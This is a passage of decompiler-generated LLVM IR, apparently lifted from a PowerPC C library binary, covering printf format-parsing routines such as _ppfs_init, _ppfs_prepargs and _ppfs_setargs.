dec_label_pc_1001ab9c:                            ; preds = %dec_label_pc_1001a9f4, %dec_label_pc_1001ab70, %dec_label_pc_1001ab00, %dec_label_pc_1001aaac, %dec_label_pc_1001aa90, %dec_label_pc_1001a950, %dec_label_pc_1001a920, %dec_label_pc_1001a8b4, %dec_label_pc_1001a5fc, %dec_label_pc_1001ab48
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1001aba0

dec_label_pc_1001aba0:                            ; preds = %dec_label_pc_1001a608, %dec_label_pc_1001a580, %dec_label_pc_1001a598, %dec_label_pc_1001ab9c
  store i32 %v0_1001a554, i32* %r0.global-to-local, align 4
  %v0_1001aba4 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1001aba4

; uselistorder directives
  uselistorder i32 %v0_1001a7e0, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1001ab18, { 2, 1, 0 }
  uselistorder i32 %v1_1001aa7c, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1001aa0c, { 1, 0 }
  uselistorder i32 %v2_1001a99c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001a8fc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1001a7e0, { 1, 0 }
  uselistorder i32 %v6_1001a798, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1001a77c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1001a768, { 1, 0 }
  uselistorder i32 %v1_1001a70c, { 1, 0 }
  uselistorder i32 %v0_1001a6b4, { 1, 0, 2 }
  uselistorder i32 %v1_1001a6a0, { 1, 0 }
  uselistorder i32 %v0_1001a698, { 1, 0 }
  uselistorder i32 %v1_1001a694, { 1, 0 }
  uselistorder i32 %v1_1001a614, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1001a5dc, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1001a5ec, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1001aa00, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v4_1001a64c, { 1, 0 }
  uselistorder i32 %v2_1001a648, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp60, { 1, 0 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 3, 2, 0, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 0, 36, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 5, 1, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder label %dec_label_pc_1001aba0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1001ab9c, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1001ab8c, { 1, 0 }
  uselistorder label %dec_label_pc_1001ab70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001ab48, { 1, 0 }
  uselistorder label %dec_label_pc_1001aaac, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa84, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa6c, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa58, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa38, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001aa38thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001aa2c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a9bc, { 1, 0 }
  uselistorder label %dec_label_pc_1001a9a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001a920, { 1, 0 }
  uselistorder label %dec_label_pc_1001a870, { 1, 0 }
  uselistorder label %dec_label_pc_1001a858, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1001a808, { 1, 0 }
  uselistorder label %dec_label_pc_1001a7ec, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1001a778, { 1, 0 }
  uselistorder label %dec_label_pc_1001a75c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a748, { 1, 0 }
  uselistorder label %dec_label_pc_1001a744, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001a6a4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001a668, { 1, 0 }
  uselistorder label %dec_label_pc_1001a608, { 1, 0 }
  uselistorder label %dec_label_pc_1001a5fc, { 1, 0 }
  uselistorder label %dec_label_pc_1001a5c0, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1001abbc = load i32, i32* @lr, align 4
  store i32 %v0_1001abbc, i32* %r0.global-to-local, align 4
  store i32 160, i32* @r5, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1001abcc = load i32, i32* @r4, align 4
  store i32 %v0_1001abcc, i32* @r30, align 4
  store i32 0, i32* @r4, align 4
  store i32 268544988, i32* @lr, align 4
  %v0_1001abd8 = call i32 @__GI_memset()
  %v0_1001abdc = load i32, i32* @r31, align 4
  %v1_1001abdc = add i32 %v0_1001abdc, 24
  %v2_1001abdc = inttoptr i32 %v1_1001abdc to i32*
  %v3_1001abdc = load i32, i32* %v2_1001abdc, align 4
  store i32 %v3_1001abdc, i32* %r9.global-to-local, align 4
  %v1_1001abe0 = add i32 %v0_1001abdc, 40
  store i32 %v1_1001abe0, i32* @r11, align 4
  %v0_1001abe4 = load i32, i32* @r30, align 4
  %v2_1001abe4 = inttoptr i32 %v0_1001abdc to i32*
  store i32 %v0_1001abe4, i32* %v2_1001abe4, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v0_1001abec = load i32, i32* %r9.global-to-local, align 4
  %v1_1001abec = add i32 %v0_1001abec, -1
  %v1_1001abf0 = load i32, i32* @r31, align 4
  %v2_1001abf0 = add i32 %v1_1001abf0, 24
  %v3_1001abf0 = inttoptr i32 %v2_1001abf0 to i32*
  store i32 %v1_1001abec, i32* %v3_1001abf0, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v1_1001abfc.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001abfc

dec_label_pc_1001abfc:                            ; preds = %dec_label_pc_1001abfc, %entry
  %v1_1001abfc = phi i32 [ %v1_1001ac00, %dec_label_pc_1001abfc ], [ %v1_1001abfc.pre, %entry ]
  %v0_1001abfc = load i32, i32* %r0.global-to-local, align 4
  %v2_1001abfc = inttoptr i32 %v1_1001abfc to i32*
  store i32 %v0_1001abfc, i32* %v2_1001abfc, align 4
  %v0_1001ac00 = load i32, i32* @r11, align 4
  %v1_1001ac00 = add i32 %v0_1001ac00, 4
  store i32 %v1_1001ac00, i32* @r11, align 4
  %v0_1001ac04 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ac04 = add i32 %v0_1001ac04, -1
  store i32 %v1_1001ac04, i32* %ctr.global-to-local, align 4
  %v2_1001ac04 = icmp eq i32 %v1_1001ac04, 0
  br i1 %v2_1001ac04, label %dec_label_pc_1001ac08, label %dec_label_pc_1001abfc

dec_label_pc_1001ac08:                            ; preds = %dec_label_pc_1001abfc
  %v0_1001ac08 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001ac48

dec_label_pc_1001ac18:                            ; preds = %dec_label_pc_1001ac48
  %v3_1001ac50 = icmp eq i8 %v2_1001ac48, 37
  br i1 %v3_1001ac50, label %dec_label_pc_1001ac1c, label %dec_label_pc_1001ac44

dec_label_pc_1001ac1c:                            ; preds = %dec_label_pc_1001ac18
  %v1_1001ac1c = add i32 %v0_1001ac1c, 1
  %v2_1001ac1c = inttoptr i32 %v1_1001ac1c to i8*
  %v3_1001ac1c = load i8, i8* %v2_1001ac1c, align 1
  %v4_1001ac1c = zext i8 %v3_1001ac1c to i32
  store i32 %v4_1001ac1c, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ac1c, i32* %r9.global-to-local, align 4
  %v3_1001ac24 = icmp eq i8 %v3_1001ac1c, 37
  br i1 %v3_1001ac24, label %dec_label_pc_1001ac44, label %dec_label_pc_1001ac2c

dec_label_pc_1001ac2c:                            ; preds = %dec_label_pc_1001ac1c
  %v0_1001ac20 = load i32, i32* @r31, align 4
  %v2_1001ac2c = inttoptr i32 %v0_1001ac20 to i32*
  store i32 %v1_1001ac1c, i32* %v2_1001ac2c, align 4
  store i32 268545076, i32* @lr, align 4
  %v1_1001ac30 = load i32, i32* %r9.global-to-local, align 4
  %v3_1001ac30 = call i32 @_ppfs_parsespec(i32* %v2_1001ac2c, i32 %v1_1001ac30)
  %v1_1001ac34 = icmp slt i32 %v3_1001ac30, 0
  br i1 %v1_1001ac34, label %dec_label_pc_1001ac60, label %dec_label_pc_1001ac3c

dec_label_pc_1001ac3c:                            ; preds = %dec_label_pc_1001ac2c
  %v0_1001ac3c = load i32, i32* @r31, align 4
  %v1_1001ac3c = inttoptr i32 %v0_1001ac3c to i32*
  %v2_1001ac3c = load i32, i32* %v1_1001ac3c, align 4
  br label %dec_label_pc_1001ac48

dec_label_pc_1001ac44:                            ; preds = %dec_label_pc_1001ac18, %dec_label_pc_1001ac1c
  %v0_1001ac44 = phi i32 [ %v0_1001ac1c, %dec_label_pc_1001ac18 ], [ %v1_1001ac1c, %dec_label_pc_1001ac1c ]
  %v1_1001ac44 = add i32 %v0_1001ac44, 1
  br label %dec_label_pc_1001ac48

dec_label_pc_1001ac48:                            ; preds = %dec_label_pc_1001ac3c, %dec_label_pc_1001ac44, %dec_label_pc_1001ac08
  %v0_1001ac1c = phi i32 [ %v0_1001ac08, %dec_label_pc_1001ac08 ], [ %v1_1001ac44, %dec_label_pc_1001ac44 ], [ %v2_1001ac3c, %dec_label_pc_1001ac3c ]
  store i32 %v0_1001ac1c, i32* %r9.global-to-local, align 4
  %v1_1001ac48 = inttoptr i32 %v0_1001ac1c to i8*
  %v2_1001ac48 = load i8, i8* %v1_1001ac48, align 1
  %v3_1001ac48 = zext i8 %v2_1001ac48 to i32
  store i32 %v3_1001ac48, i32* %r0.global-to-local, align 4
  %v3_1001ac4c = icmp eq i8 %v2_1001ac48, 0
  br i1 %v3_1001ac4c, label %dec_label_pc_1001ac58, label %dec_label_pc_1001ac18

dec_label_pc_1001ac58:                            ; preds = %dec_label_pc_1001ac48
  %v0_1001ac58 = load i32, i32* @r30, align 4
  %v1_1001ac58 = load i32, i32* @r31, align 4
  %v2_1001ac58 = inttoptr i32 %v1_1001ac58 to i32*
  store i32 %v0_1001ac58, i32* %v2_1001ac58, align 4
  br label %dec_label_pc_1001ac60

dec_label_pc_1001ac60:                            ; preds = %dec_label_pc_1001ac2c, %dec_label_pc_1001ac58
  %storemerge = phi i32 [ 0, %dec_label_pc_1001ac58 ], [ -1, %dec_label_pc_1001ac2c ]
  store i32 %v0_1001abbc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1001ac48, { 1, 2, 0 }
  uselistorder i32 %v0_1001ac1c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1001ac04, { 1, 0 }
  uselistorder i32 %v1_1001ac00, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 (i32*, i32)* @_ppfs_parsespec, { 1, 0 }
  uselistorder label %dec_label_pc_1001ac60, { 1, 0 }
  uselistorder label %dec_label_pc_1001ac48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001ac44, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1001ac78 = load i32, i32* @lr, align 4
  %v0_1001ac7c = load i32, i32* @r3, align 4
  store i32 %v0_1001ac7c, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001ac98 = add i32 %v0_1001ac7c, 24
  %v2_1001ac98 = inttoptr i32 %v1_1001ac98 to i32*
  %v3_1001ac98 = load i32, i32* %v2_1001ac98, align 4
  store i32 %v3_1001ac98, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1001ac98, 1
  br i1 %tmp4, label %dec_label_pc_1001acbc, label %dec_label_pc_1001aca4

dec_label_pc_1001aca4:                            ; preds = %entry
  %v2_1001aca4 = add i32 %v0_1001ac7c, 8
  %v3_1001aca4 = inttoptr i32 %v2_1001aca4 to i32*
  store i32 0, i32* %v3_1001aca4, align 4
  %v0_1001aca8 = load i32, i32* @r30, align 4
  %v1_1001aca8 = load i32, i32* @r3, align 4
  %v2_1001aca8 = add i32 %v1_1001aca8, 28
  %v3_1001aca8 = inttoptr i32 %v2_1001aca8 to i32*
  store i32 %v0_1001aca8, i32* %v3_1001aca8, align 4
  %v0_1001acac = load i32, i32* %r0.global-to-local, align 4
  %v1_1001acac = load i32, i32* @r3, align 4
  %v2_1001acac = add i32 %v1_1001acac, 24
  %v3_1001acac = inttoptr i32 %v2_1001acac to i32*
  store i32 %v0_1001acac, i32* %v3_1001acac, align 4
  %v0_1001acb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001acb0 = load i32, i32* @r3, align 4
  %v2_1001acb0 = add i32 %v1_1001acb0, 4
  %v3_1001acb0 = inttoptr i32 %v2_1001acb0 to i32*
  store i32 %v0_1001acb0, i32* %v3_1001acb0, align 4
  store i32 268545208, i32* @lr, align 4
  %v0_1001acb4 = call i32 @_ppfs_setargs()
  store i32 %v0_1001acb4, i32* %r3.global-to-local, align 4
  %v0_1001acb8 = load i32, i32* @r30, align 4
  %v1_1001acb8 = load i32, i32* @r31, align 4
  %v2_1001acb8 = add i32 %v1_1001acb8, 24
  %v3_1001acb8 = inttoptr i32 %v2_1001acb8 to i32*
  store i32 %v0_1001acb8, i32* %v3_1001acb8, align 4
  %v0_1001accc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001acbc

dec_label_pc_1001acbc:                            ; preds = %entry, %dec_label_pc_1001aca4
  %v0_1001accc = phi i32 [ %v0_1001ac7c, %entry ], [ %v0_1001accc.pre, %dec_label_pc_1001aca4 ]
  store i32 %v0_1001ac78, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001accc

; uselistorder directives
  uselistorder label %dec_label_pc_1001acbc, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001acd0 = load i32, i32* @r3, align 4
  %v1_1001acd0 = add i32 %v0_1001acd0, 24
  %v2_1001acd0 = inttoptr i32 %v1_1001acd0 to i32*
  %v3_1001acd0 = load i32, i32* %v2_1001acd0, align 4
  store i32 %v3_1001acd0, i32* %r0.global-to-local, align 4
  %v1_1001acd4 = add i32 %v0_1001acd0, 88
  store i32 %v1_1001acd4, i32* @r8, align 4
  %v1_1001acd8 = add i32 %v0_1001acd0, 8
  %v2_1001acd8 = inttoptr i32 %v1_1001acd8 to i32*
  %v3_1001acd8 = load i32, i32* %v2_1001acd8, align 4
  store i32 %v3_1001acd8, i32* %r9.global-to-local, align 4
  %v2_1001acdc = icmp sgt i32 %v3_1001acd0, 0
  %v3_1001acdc = icmp eq i32 %v3_1001acd0, 0
  store i1 %v2_1001acdc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001acdc, label %dec_label_pc_1001ace4, label %dec_label_pc_1001aed0

dec_label_pc_1001ace4:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1001ace8 = icmp ne i32 %v3_1001acd8, -2147483648
  %v4_1001ace8 = icmp eq i32 %v3_1001acd8, -2147483648
  store i1 %v3_1001ace8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001ace8, label %dec_label_pc_1001acf0, label %dec_label_pc_1001ad30

dec_label_pc_1001acf0:                            ; preds = %dec_label_pc_1001ace4
  %v1_1001acf0 = add i32 %v0_1001acd0, 76
  %v2_1001acf0 = inttoptr i32 %v1_1001acf0 to i8*
  %v3_1001acf0 = load i8, i8* %v2_1001acf0, align 1
  %v4_1001acf0 = zext i8 %v3_1001acf0 to i32
  store i32 %v4_1001acf0, i32* %r11.global-to-local, align 4
  store i32 %v1_1001acf0, i32* @r10, align 4
  %v2_1001acf8 = icmp ugt i8 %v3_1001acf0, 8
  store i1 %v2_1001acf8, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1001acf0, 7
  br i1 %tmp, label %dec_label_pc_1001ad18, label %dec_label_pc_1001ad00

dec_label_pc_1001ad00:                            ; preds = %dec_label_pc_1001acf0
  %v1_1001ad00 = add i32 %v0_1001acd0, 84
  %v2_1001ad00 = inttoptr i32 %v1_1001ad00 to i32*
  %v3_1001ad00 = load i32, i32* %v2_1001ad00, align 4
  store i32 %v3_1001ad00, i32* %r0.global-to-local, align 4
  %v1_1001ad04 = mul nuw nsw i32 %v4_1001acf0, 4
  store i32 %v1_1001ad04, i32* %r9.global-to-local, align 4
  %v1_1001ad08 = add nuw nsw i32 %v4_1001acf0, 1
  store i32 %v1_1001ad08, i32* %r11.global-to-local, align 4
  %v1_1001ad0c = trunc i32 %v1_1001ad08 to i8
  store i8 %v1_1001ad0c, i8* %v2_1001acf0, align 1
  %v0_1001ad10 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001ad10 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001ad10 = add i32 %v1_1001ad10, %v0_1001ad10
  store i32 %v2_1001ad10, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ad24

dec_label_pc_1001ad18:                            ; preds = %dec_label_pc_1001acf0
  %v1_1001ad18 = add i32 %v0_1001acd0, 80
  %v2_1001ad18 = inttoptr i32 %v1_1001ad18 to i32*
  %v3_1001ad18 = load i32, i32* %v2_1001ad18, align 4
  store i32 %v3_1001ad18, i32* %r9.global-to-local, align 4
  %v1_1001ad1c = add i32 %v3_1001ad18, 4
  store i32 %v1_1001ad1c, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ad1c, i32* %v2_1001ad18, align 4
  %v0_1001ad24.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ad24

dec_label_pc_1001ad24:                            ; preds = %dec_label_pc_1001ad00, %dec_label_pc_1001ad18
  %v0_1001ad24 = phi i32 [ %v2_1001ad10, %dec_label_pc_1001ad00 ], [ %v0_1001ad24.pre, %dec_label_pc_1001ad18 ]
  %v1_1001ad24 = inttoptr i32 %v0_1001ad24 to i32*
  %v2_1001ad24 = load i32, i32* %v1_1001ad24, align 4
  store i32 %v2_1001ad24, i32* %r0.global-to-local, align 4
  %v1_1001ad28 = load i32, i32* @r8, align 4
  %v2_1001ad28 = inttoptr i32 %v1_1001ad28 to i32*
  store i32 %v2_1001ad24, i32* %v2_1001ad28, align 4
  %v0_1001ad2c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001ad2c = load i32, i32* @r3, align 4
  %v2_1001ad2c = add i32 %v1_1001ad2c, 8
  %v3_1001ad2c = inttoptr i32 %v2_1001ad2c to i32*
  store i32 %v0_1001ad2c, i32* %v3_1001ad2c, align 4
  %v0_1001ad30.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001ad30

dec_label_pc_1001ad30:                            ; preds = %dec_label_pc_1001ace4, %dec_label_pc_1001ad24
  %v2_1001ad5c = phi i32 [ %v0_1001acd0, %dec_label_pc_1001ace4 ], [ %v0_1001ad30.pre, %dec_label_pc_1001ad24 ]
  %v1_1001ad30 = add i32 %v2_1001ad5c, 4
  %v2_1001ad30 = inttoptr i32 %v1_1001ad30 to i32*
  %v3_1001ad30 = load i32, i32* %v2_1001ad30, align 4
  store i32 %v3_1001ad30, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1001ad38 = icmp ne i32 %v3_1001ad30, -2147483648
  %v4_1001ad38 = icmp eq i32 %v3_1001ad30, -2147483648
  store i1 %v3_1001ad38, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001ad38, label %dec_label_pc_1001ad40, label %dec_label_pc_1001aec0.preheader

dec_label_pc_1001ad40:                            ; preds = %dec_label_pc_1001ad30
  %v1_1001ad40 = add i32 %v2_1001ad5c, 76
  %v2_1001ad40 = inttoptr i32 %v1_1001ad40 to i8*
  %v3_1001ad40 = load i8, i8* %v2_1001ad40, align 1
  %v4_1001ad40 = zext i8 %v3_1001ad40 to i32
  store i32 %v4_1001ad40, i32* %r11.global-to-local, align 4
  store i32 %v1_1001ad40, i32* @r10, align 4
  %v2_1001ad48 = icmp ugt i8 %v3_1001ad40, 8
  store i1 %v2_1001ad48, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1001ad40, 7
  br i1 %tmp26, label %dec_label_pc_1001ad68, label %dec_label_pc_1001ad50

dec_label_pc_1001ad50:                            ; preds = %dec_label_pc_1001ad40
  %v1_1001ad50 = add i32 %v2_1001ad5c, 84
  %v2_1001ad50 = inttoptr i32 %v1_1001ad50 to i32*
  %v3_1001ad50 = load i32, i32* %v2_1001ad50, align 4
  store i32 %v3_1001ad50, i32* %r0.global-to-local, align 4
  %v1_1001ad54 = mul nuw nsw i32 %v4_1001ad40, 4
  store i32 %v1_1001ad54, i32* %r9.global-to-local, align 4
  %v1_1001ad58 = add nuw nsw i32 %v4_1001ad40, 1
  store i32 %v1_1001ad58, i32* %r11.global-to-local, align 4
  %v1_1001ad5c = trunc i32 %v1_1001ad58 to i8
  store i8 %v1_1001ad5c, i8* %v2_1001ad40, align 1
  %v0_1001ad60 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001ad60 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001ad60 = add i32 %v1_1001ad60, %v0_1001ad60
  store i32 %v2_1001ad60, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ad74

dec_label_pc_1001ad68:                            ; preds = %dec_label_pc_1001ad40
  %v1_1001ad68 = add i32 %v2_1001ad5c, 80
  %v2_1001ad68 = inttoptr i32 %v1_1001ad68 to i32*
  %v3_1001ad68 = load i32, i32* %v2_1001ad68, align 4
  store i32 %v3_1001ad68, i32* %r9.global-to-local, align 4
  %v1_1001ad6c = add i32 %v3_1001ad68, 4
  store i32 %v1_1001ad6c, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ad6c, i32* %v2_1001ad68, align 4
  %v0_1001ad74.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ad74

dec_label_pc_1001ad74:                            ; preds = %dec_label_pc_1001ad50, %dec_label_pc_1001ad68
  %v0_1001ad74 = phi i32 [ %v2_1001ad60, %dec_label_pc_1001ad50 ], [ %v0_1001ad74.pre, %dec_label_pc_1001ad68 ]
  %v1_1001ad74 = inttoptr i32 %v0_1001ad74 to i32*
  %v2_1001ad74 = load i32, i32* %v1_1001ad74, align 4
  store i32 %v2_1001ad74, i32* %r0.global-to-local, align 4
  %v1_1001ad78 = load i32, i32* @r8, align 4
  %v2_1001ad78 = inttoptr i32 %v1_1001ad78 to i32*
  store i32 %v2_1001ad74, i32* %v2_1001ad78, align 4
  %v0_1001ad7c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001ad7c = load i32, i32* @r3, align 4
  %v2_1001ad7c = add i32 %v1_1001ad7c, 4
  %v3_1001ad7c = inttoptr i32 %v2_1001ad7c to i32*
  store i32 %v0_1001ad7c, i32* %v3_1001ad7c, align 4
  %v0_1001aec05.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001aec0.preheader

dec_label_pc_1001aec0.preheader:                  ; preds = %dec_label_pc_1001ad30, %dec_label_pc_1001ad74
  %v0_1001aec05 = phi i32 [ %v2_1001ad5c, %dec_label_pc_1001ad30 ], [ %v0_1001aec05.pre, %dec_label_pc_1001ad74 ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001aec06 = add i32 %v0_1001aec05, 28
  %v2_1001aec07 = inttoptr i32 %v1_1001aec06 to i32*
  %v3_1001aec08 = load i32, i32* %v2_1001aec07, align 4
  store i32 %v3_1001aec08, i32* %r0.global-to-local, align 4
  %v2_1001aec49 = icmp sgt i32 %v3_1001aec08, 0
  %v3_1001aec410 = icmp slt i32 %v3_1001aec08, 0
  store i1 %v3_1001aec410, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1001aec49, label %dec_label_pc_1001ad88, label %dec_label_pc_1001af10

dec_label_pc_1001ad88:                            ; preds = %dec_label_pc_1001aec0.preheader, %dec_label_pc_1001aebc
  %v2_1001ae98 = phi i32 [ %v0_1001aec0, %dec_label_pc_1001aebc ], [ %v0_1001aec05, %dec_label_pc_1001aec0.preheader ]
  %v0_1001ad88 = phi i32 [ %v1_1001aebc, %dec_label_pc_1001aebc ], [ 0, %dec_label_pc_1001aec0.preheader ]
  %v1_1001ad88 = mul i32 %v0_1001ad88, 4
  %v2_1001ad8c = add i32 %v1_1001ad88, %v2_1001ae98
  store i32 %v2_1001ad8c, i32* %r9.global-to-local, align 4
  %v1_1001ad90 = add i32 %v2_1001ad8c, 40
  %v2_1001ad90 = inttoptr i32 %v1_1001ad90 to i32*
  %v3_1001ad90 = load i32, i32* %v2_1001ad90, align 4
  store i32 %v3_1001ad90, i32* %r0.global-to-local, align 4
  %v2_1001ad94 = icmp sgt i32 %v3_1001ad90, 8
  %v3_1001ad94 = icmp eq i32 %v3_1001ad90, 8
  store i1 %v2_1001ad94, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001ad94, label %dec_label_pc_1001aebc, label %dec_label_pc_1001ad9c

dec_label_pc_1001ad9c:                            ; preds = %dec_label_pc_1001ad88
  %v1_1001ad9c = add i32 %v2_1001ae98, 76
  store i32 %v1_1001ad9c, i32* @r10, align 4
  br i1 %v2_1001ad94, label %dec_label_pc_1001adb8, label %dec_label_pc_1001ada4

dec_label_pc_1001ada4:                            ; preds = %dec_label_pc_1001ad9c
  %v2_1001ada4 = icmp sgt i32 %v3_1001ad90, 2
  store i1 %v2_1001ada4, i1* %cr7_gt.global-to-local, align 1
  %tmp27 = icmp slt i32 %v3_1001ad90, 3
  br i1 %tmp27, label %dec_label_pc_1001ae80, label %dec_label_pc_1001add0

dec_label_pc_1001adb8:                            ; preds = %dec_label_pc_1001ad9c
  %v2_1001adb8 = icmp sgt i32 %v3_1001ad90, 1024
  store i1 %v2_1001adb8, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = icmp slt i32 %v3_1001ad90, 1025
  br i1 %tmp28, label %dec_label_pc_1001ae80, label %dec_label_pc_1001adc4

dec_label_pc_1001adc4:                            ; preds = %dec_label_pc_1001adb8
  %v2_1001adc4 = icmp sgt i32 %v3_1001ad90, 2048
  %v3_1001adc4 = icmp eq i32 %v3_1001ad90, 2048
  store i1 %v2_1001adc4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001adc4, label %dec_label_pc_1001add8, label %dec_label_pc_1001adcc

dec_label_pc_1001adcc:                            ; preds = %dec_label_pc_1001adc4
  %v2_1001adcc = icmp sgt i32 %v3_1001ad90, 2055
  %v3_1001adcc = icmp eq i32 %v3_1001ad90, 2055
  store i1 %v2_1001adcc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001adcc, label %dec_label_pc_1001ae34, label %dec_label_pc_1001ae80

dec_label_pc_1001add0:                            ; preds = %dec_label_pc_1001ada4
  %v3_1001adb0 = icmp eq i32 %v3_1001ad90, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001adb0, label %dec_label_pc_1001ae34, label %dec_label_pc_1001ae80

dec_label_pc_1001add8:                            ; preds = %dec_label_pc_1001adc4
  %v2_1001add8 = inttoptr i32 %v1_1001ad9c to i8*
  %v3_1001add8 = load i8, i8* %v2_1001add8, align 1
  %v4_1001add8 = zext i8 %v3_1001add8 to i32
  store i32 %v4_1001add8, i32* %r0.global-to-local, align 4
  %tmp32 = urem i8 %v3_1001add8, 2
